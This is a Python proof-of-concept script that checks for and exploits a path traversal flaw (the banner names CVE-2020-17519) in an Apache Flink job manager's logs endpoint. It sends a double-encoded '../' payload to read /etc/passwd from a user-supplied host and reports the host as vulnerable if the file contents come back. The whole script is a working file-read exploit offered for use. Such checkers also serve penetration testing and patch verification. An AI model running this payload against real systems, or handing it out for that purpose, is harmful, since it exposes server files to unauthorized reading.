# -*- encoding: utf-8 -*-
# Time : 2021/01/07 14:17:47
# Author: crow

import requests
print("""
  _______      ________    ___   ___ ___   ___        __ ______ _____ __  ___  
 / ____\ \    / /  ____|  |__ \ / _ \__ \ / _ \      /_ |____  | ____/_ |/ _ \ 
| |     \ \  / /| |__ ______ ) | | | | ) | | | |______| |   / /| |__  | | (_) |
| |      \ \/ / |  __|______/ /| | | |/ /| | | |______| |  / / |___ \ | |\__, |
| |____   \  /  | |____    / /_| |_| / /_| |_| |      | | / /   ___) || |  / / 
 \_____|   \/   |______|  |____|\___/____|\___/       |_|/_/   |____/ |_| /_/  
                                                                                                                                                                        
""")

headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:83.0) Gecko/20100101 Firefox/83.0"}
payload= "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"

print("""[+]please input your ip, for example: 
            127.0.0.1:8081
            http://127.0.0.1:8081
            https:127.0.0.1:8081
""")
ip_name  = input("[+]ip: ")


def deal_url(ip_name):
    if 'http' not in ip_name and  'https' not in ip_name:
        check_name = "http://" + ip_name 
    else:
        check_name = ip_name
    # print(check_name)
    return check_name
    

def check(ip):
    url = ip + payload
    res = requests.get(url, headers=headers, timeout=3)
    # print(res.text)
    if "sbin/nologin" in res.text:
        print('[+] {} is vulnerable'.format(ip))
    else:
        print('[+] it seems not vulnerable')


if __name__ == '__main__':
    check_ip = deal_url(ip_name)
    check(check_ip)

